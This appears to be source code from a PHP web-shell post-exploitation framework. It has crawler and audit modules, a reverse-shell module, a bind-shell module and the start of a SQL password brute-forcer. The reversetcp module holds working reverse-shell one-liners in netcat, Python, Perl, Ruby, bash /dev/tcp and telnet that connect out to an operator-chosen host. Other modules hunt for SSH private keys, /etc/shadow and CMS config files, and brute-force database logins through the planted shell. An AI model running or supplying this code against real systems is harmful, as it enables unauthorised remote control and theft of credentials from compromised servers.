        self.visited_links= set()       # Used to avoid re-processing a page
        self.links_remembered = set()   # For reporting to user

        self.num_links = 0              # Links found (and not excluded by filters)
        self.num_followed = 0           # Links followed.

        # Pre-visit filters:  Only visit a URL if it passes these tests
        self.pre_visit_filters=[self._prefix_ok,
                                self._exclude_ok,
                                self._not_visited,
                                self._same_host]

        # Out-url filters: When examining a visited page, only process
        # links where the target matches these filters.
        if filter_seen:
            self.out_url_filters=[self._prefix_ok,
                                     self._same_host]
        else:
            self.out_url_filters=[]

    def _pre_visit_url_condense(self, url):

        """ Reduce (condense) URLs into some canonical form before
        visiting.  All occurrences of equivalent URLs are treated as
        identical.

        All this does is strip the \"fragment\" component from URLs,
        so that http://foo.com/blah.html\#baz becomes
        http://foo.com/blah.html """

        base, frag = urlparse.urldefrag(url)
        return base

    ## URL Filtering functions.  These all use information from the
    ## state of the Crawler to evaluate whether a given URL should be
    ## used in some context.  Return value of True indicates that the
    ## URL should be used.

    def _prefix_ok(self, url):
        """Pass if the URL has the correct prefix, or none is specified"""
        return (self.confine_prefix is None  or
                url.startswith(self.confine_prefix))

    def _exclude_ok(self, url):
        """Pass if the URL does not match any exclude patterns"""
        prefixes_ok = [ not url.startswith(p) for p in self.exclude_prefixes]
        return all(prefixes_ok)

    def _not_visited(self, url):
        """Pass if the URL has not already been visited"""
        return (url not in self.visited_links)

    def _same_host(self, url):
        """Pass if the URL is on the same host as the root URL"""
        try:
            host = urlparse.urlparse(url)[1]
            return re.match(".*%s" % self.host, host)
        except Exception, e:
            print >> sys.stderr, "ERROR: Can't process url '%s' (%s)" % (url, e)
            return False


    def crawl(self):

        """ Main function in the crawling process.  Core algorithm is:

        q <- starting page
        while q not empty:
           url <- q.get()
           if url is new and suitable:
              page <- fetch(url)
              q.put(urls found in page)
           else:
              nothing

        new and suitable means that we don't re-visit URLs we've seen
        already fetched, and user-supplied criteria like maximum
        search depth are checked. """

        q = Queue()
        q.put((self.root, 0))

        while not q.empty():
            this_url, depth = q.get()

            #Non-URL-specific filter: Discard anything over depth limit
            if depth > self.depth_limit:
                continue

            #Apply URL-based filters.
            do_not_follow = [f for f in self.pre_visit_filters if not f(this_url)]

            #Special-case depth 0 (starting URL)
            if depth == 0 and [] != do_not_follow:
                print >> sys.stderr, "Whoops! Starting URL %s rejected by the following filters:", do_not_follow

            #If no filters failed (that is, all passed), process URL
            if [] == do_not_follow:
                try:
                    self.visited_links.add(this_url)
                    self.num_followed += 1
                    page = Fetcher(this_url)
                    page.fetch()
                    for link_url in [self._pre_visit_url_condense(l) for l in page.out_links()]:
                        if link_url not in self.urls_seen:
                            q.put((link_url, depth+1))
                            self.urls_seen.add(link_url)

                        do_not_remember = [f for f in self.out_url_filters if not f(link_url)]
                        if [] == do_not_remember:
                                self.num_links += 1
                                self.urls_remembered.add(link_url)
                                link = Link(this_url, link_url, "href")
                                if link not in self.links_remembered:
                                    self.links_remembered.add(link)
                                    
                except ModuleException, e:
                    raise
                except Exception, e:
                    print >>sys.stderr, "ERROR: Can't process url '%s' (%s)" % (this_url, e)
                    #print format_exc()

class OpaqueDataException (Exception):
    def __init__(self, message, mimetype, url):
        Exception.__init__(self, message)
        self.mimetype=mimetype
        self.url=url


class Fetcher(object):

    """The name Fetcher is a slight misnomer: This class retrieves and interprets web pages."""

    def __init__(self, url):
        self.url = url
        self.out_urls = []

    def __getitem__(self, x):
        return self.out_urls[x]

    def out_links(self):
        return self.out_urls

    def _addHeaders(self, request):
        request.add_header("User-Agent", AGENT)

    def _open(self):
        url = self.url
        try:
            request = urllib2.Request(url)
            handle = urllib2.build_opener()
        except IOError:
            return None
        return (request, handle)

    def fetch(self):
        
        
        try:
            from BeautifulSoup import BeautifulSoup
        except ImportError:
            try:
                from bs4 import BeautifulSoup
            except ImportError:
                raise ModuleException('crawler','BeautifulSoup python module required. In Debian-like Linux run:\nsudo apt-get install python-beautifulsoup')
        
        
        request, handle = self._open()
        self._addHeaders(request)
        if handle:
            try:
                data=handle.open(request)
                mime_type=data.info().gettype()
                url=data.geturl();
                if mime_type != "text/html":
                    raise OpaqueDataException("Not interested in files of type %s" % mime_type,
                                              mime_type, url)
                content = unicode(data.read(), "utf-8",
                        errors="replace")
                soup = BeautifulSoup(content)
                tags = soup('a')
            except urllib2.HTTPError, error:
                if error.code == 404:
                    print >> sys.stderr, "ERROR: %s -> %s" % (error, error.url)
                else:
                    print >> sys.stderr, "ERROR: %s" % error
                tags = []
            except urllib2.URLError, error:
                print >> sys.stderr, "ERROR: %s" % error
                tags = []
            except OpaqueDataException, error:
                #print >>sys.stderr, "Skipping %s, has type %s" % (error.url, error.mimetype)
                tags = []
            for tag in tags:
                href = tag.get("href")
                if href is not None:
                    url = urlparse.urljoin(self.url, escape(href))
                    if url not in self:
                        self.out_urls.append(url)

########NEW FILE########
__FILENAME__ = mapwebfiles
from core.module import Module
from core.moduleexception import ProbeException, ModuleException
from core.argparse import ArgumentParser
from external.crawler import Crawler
from ast import literal_eval
from core.prettytable import PrettyTable
import os
from core.utils import join_abs_paths, url_validator

WARN_CRAWLER_EXCEPT = 'Crawler exception'
WARN_CRAWLER_NO_URLS = "No sub URLs crawled. Check URL."
WARN_NOT_URL = 'Not a valid URL'


class Mapwebfiles(Module):
    '''Crawl and enumerate web folders files permissions'''


    def _set_vectors(self):
        self.support_vectors.add_vector('enum', 'file.enum', ["asd", "-pathlist", "$pathlist"])
    
    def _set_args(self):
        self.argparser.add_argument('url', help='HTTP URL where start crawling (es. http://host/path/page.html)')
        self.argparser.add_argument('baseurl', help='HTTP base url (es. http://host/path/)')
        self.argparser.add_argument('rpath', help='Remote web root corresponding to crawled path (es. /var/www/path)')
        self.argparser.add_argument('-depth', help='Crawl depth', type=int, default=3)


    def _prepare(self):
    
        if not url_validator.match(self.args['url']):
            raise ProbeException(self.name, '\'%s\': %s' % (self.args['url'], WARN_NOT_URL) )
        if not url_validator.match(self.args['baseurl']):
            raise ProbeException(self.name, '\'%s\': %s' % (self.args['baseurl'], WARN_NOT_URL) )
    
        url = self.args['url']    
        baseurl = self.args['baseurl']
        rpath = self.args['rpath']
        
        urls = []
    
        try:
            crawler = Crawler(url, self.args['depth'], '', '')
            crawler.crawl()
        except ModuleException, e:
            raise
        except Exception, e:
            raise ProbeException(self.name, "%s: %s" % (ERR_CRAWLER_EXCEPT, str(e)))
        else:
            urls = set(crawler.visited_links.union(crawler.urls_seen))
            
            # If no url, or the only one is the specified one
            
            if not urls or (urls and len(urls) == 1 and list(urls)[0] == url):
                raise ProbeException(self.name, WARN_CRAWLER_NO_URLS )
        
        
            self.args['paths'] = []
            for path in urls:
                self.args['paths'].append('/' + join_abs_paths([rpath, path[len(baseurl):]]))
                


    def _probe(self):

        self._result = self.support_vectors.get('enum').execute({'pathlist' : str(self.args['paths']) })
########NEW FILE########
__FILENAME__ = phpconf
from core.module import Module
from core.moduleexception import ProbeException
from core.argparse import ArgumentParser
from ast import literal_eval
from core.utils import chunks
from re import findall
from types import ListType
from core.prettytable import PrettyTable, ALL
import os

MSG_BASEDIR='Your base directory is presently set to $$BASEDIR$$ - PHP scripts will not be able to access the file system outside of this directory.'

ERR_CONFIG_BASEDIR='Enabled base_dir conf '
ERR_CONFIG_BASEDIR_NOT_SET='not restricted '
ERR_CONFIG_BASEDIR_CHDIR='\nchangeable because of \'.\' '
ERR_CONFIG_BASEDIR_SLASH='\nwithout trailing "/" '

ERR_CONFIG_PHPUSER='Root account could be abuse'
WARN_CONFIG_PHPUSER_WIN='Ensure that this user is not an administrator'

ERR_FUNCTION_PROFILE='Enabled functs to gather\nPHP configuration'
WARN_FUNCTION_FILES='Enabled functs to access\nto the filesystem'
ERR_FUNCTION_EXECUTE='Enabled functs to execute\ncommands'
ERR_FUNCTION_LOGGING='Enabled functs to tamper\nlog files'
ERR_FUNCTION_DISRUPT='Enabled functs to disrupt\nother process'

ERR_CONFIG_EXECUTE='Enabled confs that allow\ncommand executions'
ERR_CONFIG_ERRORS='Enble confs that displays\ninformation on errors'

WARN_CONFIG_SAFEMODE='Enabled confs that restrict\nfilesystem access and\nsystem command execution'
WARN_SESS_PATH = 'Disabled conf to move sessions\nfiles in a protected folder'

WARN_CONFIG_UPLOAD='Enabled confs to\nupload files'
ERR_CONFIG_INCLUDES='Enabled confs to allow\nremote files opening'
ERR_CONFIG_PROFILE='Enabled confs to gather\nPHP configuration infos'
ERR_CONFIG_GLOBALS='Enabled conf register_globals\nallows malicious variable manipulation'
WARN_MAGIC_QUOTES='Enabled confs that provide\nineffective SQLi protection'
ERR_SESS_TRANS='Enabled conf to pass\nsession ID via the URL'

insecure_features = """
$insecure_features = array();

$insecure_features['expose_php'] = 'ERR_CONFIG_PROFILE';
$insecure_features['file_uploads'] = 'WARN_CONFIG_UPLOAD';
$insecure_features['register_globals'] = 'ERR_CONFIG_GLOBALS';
$insecure_features['allow_url_fopen'] = 'ERR_CONFIG_INCLUDES';
$insecure_features['display_errors'] = 'ERR_CONFIG_ERRORS';
$insecure_features['enable_dl'] = 'ERR_CONFIG_EXECUTE';
$insecure_features['safe_mode'] = 'WARN_CONFIG_SAFEMODE';
$insecure_features['magic_quotes_gpc'] = 'WARN_MAGIC_QUOTES';
$insecure_features['allow_url_include'] = 'ERR_CONFIG_INCLUDES';
$insecure_features['session.use_trans_sid'] = 'ERR_SESS_TRANS';

foreach ( $insecure_features as $feature_key => $feature_message )
    if ((bool)ini_get($feature_key) ) print($feature_key . " " . $feature_message. "|");"""

insecure_classes = """
$insecure_classes = array();
$insecure_classes['splFileObject'] = 'ERR_CONFIG_EXECUTE';
foreach ( $insecure_classes as $class_key => $class_message )
{
    if ( class_exists($class_key) ) print($class_key . "() " . $class_message . "|");
}"""

insecure_functions = """
$insecure_functions = array();
$insecure_functions['apache_child_terminate'] = 'ERR_FUNCTION_PROFILE';
$insecure_functions['apache_get_modules'] = 'ERR_FUNCTION_PROFILE';
$insecure_functions['apache_get_version'] = 'ERR_FUNCTION_PROFILE';
$insecure_functions['apache_getenv'] = 'ERR_FUNCTION_PROFILE';
$insecure_functions['get_loaded_extensions'] = 'ERR_FUNCTION_PROFILE';
$insecure_functions['phpinfo'] = 'ERR_FUNCTION_PROFILE';
$insecure_functions['phpversion'] = 'ERR_FUNCTION_PROFILE';
$insecure_functions['chgrp'] = 'WARN_FUNCTION_FILES';
$insecure_functions['chmod'] = 'WARN_FUNCTION_FILES';
$insecure_functions['chown'] = 'WARN_FUNCTION_FILES';
$insecure_functions['copy'] = 'WARN_FUNCTION_FILES';
$insecure_functions['link'] = 'WARN_FUNCTION_FILES';
$insecure_functions['mkdir'] = 'WARN_FUNCTION_FILES';
$insecure_functions['rename'] = 'WARN_FUNCTION_FILES';
$insecure_functions['rmdir'] = 'WARN_FUNCTION_FILES';
$insecure_functions['symlink'] = 'WARN_FUNCTION_FILES';
$insecure_functions['touch'] = 'WARN_FUNCTION_FILES';
$insecure_functions['unlink'] = 'WARN_FUNCTION_FILES';
$insecure_functions['openlog'] = 'ERR_FUNCTION_LOGGING';
$insecure_functions['proc_nice'] = 'ERR_FUNCTION_DISRUPT';
$insecure_functions['syslog'] = 'ERR_FUNCTION_LOGGING';
$insecure_functions['apache_note'] = 'ERR_FUNCTION_EXECUTE';
$insecure_functions['apache_setenv'] = 'ERR_FUNCTION_EXECUTE';
$insecure_functions['dl'] = 'ERR_FUNCTION_EXECUTE';
$insecure_functions['exec'] = 'ERR_FUNCTION_EXECUTE';
$insecure_functions['passthru'] = 'ERR_FUNCTION_EXECUTE';
$insecure_functions['pcntl_exec'] = 'ERR_FUNCTION_EXECUTE';
$insecure_functions['popen'] = 'ERR_FUNCTION_EXECUTE';
$insecure_functions['proc_close'] = 'ERR_FUNCTION_EXECUTE';
$insecure_functions['proc_open'] = 'ERR_FUNCTION_EXECUTE';
$insecure_functions['proc_get_status'] = 'ERR_FUNCTION_EXECUTE';
$insecure_functions['proc_terminate'] = 'ERR_FUNCTION_EXECUTE';
$insecure_functions['putenv'] = 'ERR_FUNCTION_EXECUTE';
$insecure_functions['shell_exec'] = 'ERR_FUNCTION_EXECUTE';
$insecure_functions['system'] = 'ERR_FUNCTION_EXECUTE';
$insecure_functions['virtual'] = 'ERR_FUNCTION_EXECUTE';

foreach ( $insecure_functions as $function_key => $function_message )
{
    if ( function_exists($function_key) )
        print($function_key . "() " . $function_message. "|");
}"""



class Phpconf(Module):
    '''Check php security configurations'''

    def _set_vectors(self):
                
        self.support_vectors.add_vector('os', 'system.info', ["os"])
        self.support_vectors.add_vector('whoami', 'system.info', ["whoami"])
        self.support_vectors.add_vector('php_version', 'system.info', ['php_version'])
        self.support_vectors.add_vector('open_basedir', 'system.info', ['open_basedir'])
        self.support_vectors.add_vector('check_functions', 'shell.php', [ insecure_functions ])
        self.support_vectors.add_vector('check_classes', 'shell.php', [ insecure_classes ])
        self.support_vectors.add_vector('check_features', 'shell.php', [ insecure_features ])
    
    def __check_os(self):

        os = self.support_vectors.get('os').execute()
        if 'win' in os.lower():
            os = 'win'
        else:
            os = 'Linux'
            
        self._result['os'] = [ os ]
    
    def __check_version(self):
        
        self._result['PHP version'] = [  self.support_vectors.get('php_version').execute() ]
    
    def __check_username(self):
        
        username = [ self.support_vectors.get('whoami').execute() ]
        
        if self._result['os'] == 'win':
            self._result['username\n(%s)' % WARN_CONFIG_PHPUSER_WIN] = username
        elif  username == 'root':
            self._result['username\n(%s)' %  ERR_CONFIG_PHPUSER] = username
        else:
            self._result['username'] = username

    def __check_openbasedir(self):
        basedir_str = self.support_vectors.get('open_basedir').execute()
        
        err_msg = ERR_CONFIG_BASEDIR
        

        if not basedir_str:
            err_msg += ERR_CONFIG_BASEDIR_NOT_SET
            self._result_insecurities[err_msg] = [ ]
        else:
            
            if self._result['os'] == 'win':
                dirs = basedir_str.split(';')
            else:
                dirs = basedir_str.split(':') 
                 
            if '.' in dirs: 
                err_msg += ERR_CONFIG_BASEDIR_CHDIR
                
            trailing_slash = True
            for d in dirs:
                if self._result['os'] == 'win' and not d.endswith('\\') or self._result['os'] == 'Linux' and  not d.endswith('/'):
                    trailing_slash = False
            
            if not trailing_slash:
                err_msg += ERR_CONFIG_BASEDIR_SLASH 
            
            self._result_insecurities[err_msg] = dirs
            
                        
                
                
    def __check_insecurities(self):
        
        functions_str = self.support_vectors.get('check_functions').execute() + self.support_vectors.get('check_classes').execute() + self.support_vectors.get('check_features').execute()
        if functions_str:
            functions = findall('([\S]+) ([^|]+)\|',functions_str)
            for funct, err in functions:
                if err in globals():
                    error_msg = globals()[err]
                    if error_msg not in self._result_insecurities:
                        self._result_insecurities[error_msg] = []
                        
                    self._result_insecurities[error_msg].append(funct)

    def _prepare(self):
        self._result = {}
        self._result_insecurities = {}
    
    def _probe(self):

        self.__check_os()
        self.__check_version()
        self.__check_username()
        self.__check_openbasedir()
        self.__check_insecurities()

            
    def _stringify_result(self):
        
        Module._stringify_result(self)

        table_insecurities = PrettyTable(['']*(2))
        table_insecurities.align = 'l'
        table_insecurities.header = False
        table_insecurities.hrules = ALL
        
        for res in self._result_insecurities:
            if isinstance(self._result_insecurities[res], ListType):
                field_str = ''

                for chunk in list(chunks(self._result_insecurities[res],3)):
                    field_str += ', '.join(chunk) + '\n'
                    
                table_insecurities.add_row([res, field_str.rstrip() ])


        self._output += '\n%s' % ( table_insecurities.get_string())
        
                        
########NEW FILE########
__FILENAME__ = systemfiles
from core.module import Module
from core.moduleexception import ProbeException
from core.argparse import ArgumentParser
from ast import literal_eval
from core.utils import join_abs_paths
from re import compile
import os


class Systemfiles(Module):
    '''Find wrong system files permissions'''

    def _set_vectors(self):
        self.support_vectors.add_vector('find', 'find.perms', ["$path", "$mode"])
        self.support_vectors.add_vector('findfiles', 'find.perms', ["$path", "$mode", "-type", "f"])
        self.support_vectors.add_vector('findnorecurs', 'find.perms', ["$path", "$mode", "-no-recursion"])
        self.support_vectors.add_vector('findfilesnorecurs', 'find.perms', ["$path", "$mode", "-no-recursion", "-type", "f"])
        self.support_vectors.add_vector('users', 'audit.etcpasswd', ["-real"])
        self.support_vectors.add_vector('check', 'file.check', ["$path", "$attr"])
    
    def _set_args(self):
        
        self.audits = ( 'etc_readable', 'etc_writable', 'crons', 'homes', 'logs', 'binslibs', 'root')
        self.argparser.add_argument('audit', default='all', choices=self.audits + ('all',), nargs='?')

    def __etc_writable(self):
        result = self.support_vectors.get('find').execute({'path' : '/etc/', 'mode' : '-writable' })   
        self.mprint('Writable files in \'/etc/\' and subfolders ..')
        if result: 
            self.mprint('\n'.join(result), module_name='')   
            return {'etc_writable' : result }
        else:
            return {}

    def __etc_readable(self):
        
        sensibles = [ 'shadow', 'ap-secrets', 'NetworkManager.*connections', 'mysql/debian.cnf', 'sa_key$', 'keys' '\.gpg', 'sudoers' ]
        sensibles_re = compile('.*%s.*' % '.*|.*'.join(sensibles))
        
        allresults = self.support_vectors.get('findfiles').execute({'path' : '/etc/', 'mode' : '-readable' })   
        
        result = [ r for r in allresults if sensibles_re.match(r) ]
        
        self.mprint('Readable sensible files in \'/etc/\' and subfolders ..')
        
        if result: 
            self.mprint('\n'.join(result), module_name='')   
            return {'etc_writable' : result }
        else:
            return {}
        
    def __crons(self):
        result = self.support_vectors.get('find').execute({'path' : '/var/spool/cron/', 'mode' : '-writable' })   
        self.mprint('Writable files in \'/var/spool/cron\' and subfolders ..')
        if result: 
            self.mprint('\n'.join(result), module_name='')   
            return { 'cron_writable' : result }
        else:
            return {}
        
    def __homes(self):
        dict_result = {}
        
        result = self.support_vectors.get('findnorecurs').execute({'path' : '/home/', 'mode' : '-writable'})  
        result += ['/root'] if self.support_vectors.get('check').execute({'path' : '/root', 'attr' : 'write' }) else []
        self.mprint('Writable folders in \'/home/*\', \'/root/\' ..')
        if result: 
            self.mprint('\n'.join(result), module_name='')  
            dict_result.update({'home_writable': result })
            
        result = self.support_vectors.get('findnorecurs').execute({'path' : '/home/', 'mode' : '-executable' })  
        result += ['/root'] if self.support_vectors.get('check').execute({'path' : '/root', 'attr' : 'exec' }) else [] 
        self.mprint('Browsable folders \'/home/*\', \'/root/\' ..')
        if result: 
            self.mprint('\n'.join(result), module_name='')  
            dict_result.update({'home_executable': result })

        
        
        return dict_result
        
    def __logs(self):
        
        commons = [ 'lastlog', 'dpkg', 'Xorg', 'wtmp', 'pm', 'alternatives', 'udev', 'boot' ]
        commons_re = compile('.*%s.*' % '.*|.*'.join(commons))
        
        allresults = self.support_vectors.get('findfilesnorecurs').execute({'path' : '/var/log/', 'mode' : '-readable' }) 
        
        result = [ r for r in allresults if not commons_re.match(r) ]
          
        self.mprint('Readable files in \'/var/log/\' and subfolders ..')

        if result: 
            self.mprint('\n'.join(result), module_name='')  
            return { 'log_writable' : result }
        else:
            return {}

    def __binslibs(self):
        
        dict_result = {}
        paths = ['/bin/', '/usr/bin/', '/usr/sbin', '/sbin', '/usr/local/bin', '/usr/local/sbin']
        paths += ['/lib/', '/usr/lib/', '/usr/local/lib' ]
        
        for path in paths:
            result = self.support_vectors.get('find').execute({'path' : path, 'mode' : '-writable' })   
            self.mprint('Writable files in \'%s\' and subfolders ..' % path)
            if result: 
                self.mprint('\n'.join(result), module_name='')  
                dict_result.update({ '%s_writable' % path : result })
                
        return dict_result
        
    def __root(self):
        
        result = self.support_vectors.get('findnorecurs').execute({'path' : '/', 'mode' : '-writable' })  
        self.mprint('Writable folders in \'/\' ..')
        if result: 
            self.mprint('\n'.join(result), module_name='')  
            return { 'root_writable' : result }
        else:
            return {}
            
    def _probe(self):
        
        self._result = {}
        
        for audit in self.audits:
            if self.args['audit'] in (audit, 'all'):
                funct = getattr(self,'_Systemfiles__%s' % audit)
                self._result.update(funct())
                         
       
    def _stringify_result(self):
       pass
                        
########NEW FILE########
__FILENAME__ = userfiles
from core.module import Module
from core.moduleexception import ProbeException
from core.argparse import ArgumentParser
from ast import literal_eval
from core.utils import join_abs_paths
import os


class Userfiles(Module):
    '''Guess files with wrong permissions in users home folders'''

    def _set_vectors(self):
        self.support_vectors.add_vector('enum', 'file.enum', ["asd", "-pathlist", "$pathlist"])
        self.support_vectors.add_vector('users', 'audit.etcpasswd', ["-real"])
    
    def _set_args(self):
        self.argparser.add_argument('-auto-web', help='Enumerate common files in /home/*', action='store_true')
        self.argparser.add_argument('-auto-home', help='Enumerate common files in /home/*/public_html/', action='store_true')
        self.argparser.add_argument('-pathfile', help='Enumerate paths in PATHLIST in /home/*')
        self.argparser.add_argument('-pathlist', help='Enumerate path written as [\'path1\', \'path2\',] in /home/*', type=type([]), default=[])



    common_files = {

                    "home" : [ ".bashrc",
                              ".bash_history",
                              ".profile",
                              ".ssh",
                              ".ssh/authorized_keys",
                              ".ssh/known_hosts",
                              ".ssh/id_rsa",
                              ".ssh/id_rsa.pub",
                              ".mysql_history",
                              ".bash_logout",
                              ],
                    "web" : [ "public_html/",
                             "public_html/wp-config.php", # wordpress
                             "public_html/config.php",
                             "public_html/uploads",
                             "public_html/configuration.php", # joomla
                             "public_html/sites/default/settings.php", # drupal
                             "public_html/.htaccess" ]

                    }

    def _prepare(self):
        
        self._result = {}
        
        if self.args['pathfile']:
            try:
                filelist=open(os.path.expanduser(self.args['pathfile']),'r').read().splitlines()
            except:
                raise ProbeException(self.name,  "Error opening path list \'%s\'" % self.args['pathfile'])
        elif self.args['pathlist']:
            filelist = self.args['pathlist']
        elif self.args['auto_home']:
            filelist = self.common_files['home']   
        elif self.args['auto_web']:
            filelist = self.common_files['web']
        else:
            filelist = self.common_files['web'] + self.common_files['home']   
             

        result = self.support_vectors.get('users').execute()
        if not result:
            raise ProbeException(self.name, 'Cant extract system users')
        
        
        self.args['paths'] = []
        for u in result:
            for f in filelist:
                self.args['paths'].append('/' + join_abs_paths([result[u].home, f]) )
                

    def _probe(self):
        result = self.support_vectors.get('enum').execute({'pathlist' : str(self.args['paths']) })
        for user in result:
            if result[user] != ['', '', '', '']:
                self._result[user] = result[user]
        
            
########NEW FILE########
__FILENAME__ = reversetcp
from core.moduleguess import ModuleGuess
from core.moduleexception import ModuleException, ProbeSucceed, ProbeException, ExecutionException
from core.argparse import ArgumentParser
from urlparse import urlparse
from telnetlib import Telnet
from time import sleep
import socket, select, sys
        
WARN_BINDING_SOCKET = 'Binding socket'

class TcpServer:
    
    def __init__(self, port):
        self.connect = False
        self.hostname = '127.0.0.1'
        self.port = port
        
        
        socket_state = False
        
        self.connect_socket()
        self.forward_data()
        
    
    def connect_socket(self):
        if(self.connect):
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.connect( (self.hostname, self.port) )
                
        else:
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,  1)
            try:
                server.setsockopt(socket.SOL_SOCKET, socket.TCP_NODELAY, 1)
            except socket.error:
                #print("Warning: unable to set TCP_NODELAY...")
                pass
        
            try:    
                server.bind(('localhost', self.port))
            except socket.error, e:
                raise ProbeException('backdoor.reversetcp', '%s %s' % (WARN_BINDING_SOCKET, str(e)))
            
            server.listen(1)
            
            server.settimeout(3)

            try:
                self.socket, address = server.accept()
            except socket.timeout, e:
                server.close()
                raise ExecutionException('backdoor.reversetcp', 'timeout')

    def forward_data(self):
        self.socket.setblocking(0)
        print '[backdoor.reversetcp] Reverse shell connected, insert commands'
        
        
        while(1):
            read_ready, write_ready, in_error = select.select([self.socket, sys.stdin], [], [self.socket, sys.stdin])
            
            try:
                buffer = self.socket.recv(100)
                while( buffer  != ''):
                    
                    self.socket_state = True
                    
                    sys.stdout.write(buffer)
                    sys.stdout.flush()
                    buffer = self.socket.recv(100)
                if(buffer == ''):
                    return 
            except socket.error:
                pass
            while(1):
                r, w, e = select.select([sys.stdin],[],[],0)
                if(len(r) == 0):
                    break;
                c = sys.stdin.read(1)
                if(c == ''):
                    return 
                if(self.socket.sendall(c) != None):
                    return 
                
                
        

class Reversetcp(ModuleGuess):
    '''Send reverse TCP shell'''

    def _set_vectors(self):
        self.vectors.add_vector('netcat-traditional', 'shell.sh',  """sleep 1; nc -e $shell $host $port""")
        self.vectors.add_vector('netcat-bsd','shell.sh',  """sleep 1; rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|$shell -i 2>&1|nc $host $port >/tmp/f""")
        self.vectors.add_vector( 'python','shell.sh', """sleep 1; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$host",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["$shell","-i"]);'""")
        self.vectors.add_vector('devtcp','shell.sh',  "sleep 1; /bin/bash -c \'$shell 0</dev/tcp/$host/$port 1>&0 2>&0\'")
        self.vectors.add_vector('perl','shell.sh',  """perl -e 'use Socket;$i="$host";$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'""")
        self.vectors.add_vector('ruby','shell.sh', """ruby -rsocket -e'f=TCPSocket.open("$host",$port).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'""")
        self.vectors.add_vector('telnet','shell.sh', """sleep 1;rm -rf /tmp/backpipe;mknod /tmp/backpipe p;telnet $host $port 0</tmp/backpipe | /bin/sh 1>/tmp/backpipe""")
        self.vectors.add_vector( 'python-pty','shell.sh', """sleep 1; python -c 'import socket,pty,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$host",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);pty.spawn("/bin/bash");'""")
    
    def _set_args(self):
        self.argparser.add_argument('host', help='Host where connect to')
        self.argparser.add_argument('-port', help='Port', type=int, default=19091)
        self.argparser.add_argument('-shell', help='Shell', default='/bin/sh')
        self.argparser.add_argument('-vector', choices = self.vectors.keys())
        self.argparser.add_argument('-no-connect', help='Skip autoconnect', action='store_true')



    def _execute_vector(self):
        self.current_vector.execute_background( { 'port': self.args['port'], 'shell' : self.args['shell'], 'host' : self.args['host'] })
        if not self.args['no_connect']:
            if TcpServer(self.args['port']).socket_state:
                raise ProbeSucceed(self.name, 'Tcp connection succeed')

########NEW FILE########
__FILENAME__ = tcp
from core.moduleguess import ModuleGuess
from core.moduleexception import ModuleException, ProbeSucceed, ProbeException, ExecutionException
from core.argparse import ArgumentParser
from urlparse import urlparse
from socket import error
from telnetlib import Telnet
from time import sleep
        

class Tcp(ModuleGuess):
    '''Open a shell on TCP port'''


        
    def _set_vectors(self):

        self.vectors.add_vector('netcat-traditional','shell.sh',  """nc -l -p $port -e $shell""")
        self.vectors.add_vector('netcat-bsd', 'shell.sh', """rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|$shell -i 2>&1|nc -l $port >/tmp/f; rm -rf /tmp/f""")
        self.vectors.add_vector('python-pty','shell.sh',  """python -c 'import pty,os,socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(("", $port));s.listen(1);(rem, addr) = s.accept();os.dup2(rem.fileno(),0);os.dup2(rem.fileno(),1);os.dup2(rem.fileno(),2);pty.spawn("/bin/bash");s.close()';""")
            


    def _set_args(self):
        self.argparser.add_argument('port', help='Port to open', type=int)
        self.argparser.add_argument('-shell', help='Shell', default='/bin/sh')
        self.argparser.add_argument('-vector', choices = self.vectors.keys())
        self.argparser.add_argument('-no-connect', help='Skip autoconnect', action='store_true')

    def _prepare(self):
        self._result = ''
        
    def _execute_vector(self):
        self.current_vector.execute_background( { 'port': self.args['port'], 'shell' : self.args['shell'] })
        sleep(1)
        
    
    def _verify_vector_execution(self):
        
        if not self.args['no_connect']:
            
            urlparsed = urlparse(self.modhandler.url)
            if urlparsed.hostname:
                try:
                    Telnet(urlparsed.hostname, self.args['port']).interact()
                except error, e:
                    self._result += '%s: %s\n' % (self.current_vector.name, str(e))  
                    raise ExecutionException(self.name, str(e))

########NEW FILE########
__FILENAME__ = sql
from core.module import Module
from core.moduleexception import ProbeException, ProbeSucceed
from core.argparse import ArgumentParser
from ast import literal_eval
from core.argparse import SUPPRESS
from os import sep
from string import ascii_lowercase
from random import choice
from re import compile

WARN_CHUNKSIZE_TOO_BIG = 'Reduce it bruteforcing remote hosts to speed up the process' 
WARN_NO_SUCH_FILE = 'No such file or permission denied'
WARN_NO_WORDLIST = 'Impossible to load a valid word list, use -wordfile or -wordlist'
WARN_STARTLINE = 'Wrong start line'
WARN_NOT_CALLABLE = 'Function not callable, use -dbms to change db management system'


def chunks(l, n):
    return [l[i:i+n] for i in range(0, len(l), n)]

def uniq(seq):
    seen = set()
    seen_add = seen.add
    return [ x for x in seq if x not in seen and not seen_add(x)]

class Sql(Module):
    """Bruteforce SQL username"""
    

    def _set_vectors(self):
        self.support_vectors.add_vector('check_connect','shell.php',  "(is_callable('$dbms_connect') && print(1)) || print(0);")
        self.support_vectors.add_vector( 'mysql','shell.php', [ """ini_set('mysql.connect_timeout',1);
    foreach(split('[\n]+',$_POST["$post_field"]) as $pwd) {
    $c=@mysql_connect("$hostname", "$username", "$pwd");
    if($c){
    print("+ $username:" . $pwd . "\n");
    break;
    }
    }mysql_close();""", "-post", "{\'$post_field\' : \'$data\' }"])
        self.support_vectors.add_vector('postgres','shell.php',  [ """foreach(split('[\n]+',$_POST["$post_field"]) as $pwd) {
    $c=@pg_connect("host=$hostname user=$username password=" . $pwd . " connect_timeout=1");
    if($c){
    print("+ $username:" . $pwd . "\n");
    break;
    }
    }pg_close();""", "-post", "{\'$post_field\' : \'$data\' }"])
        
    
    def _set_args(self):
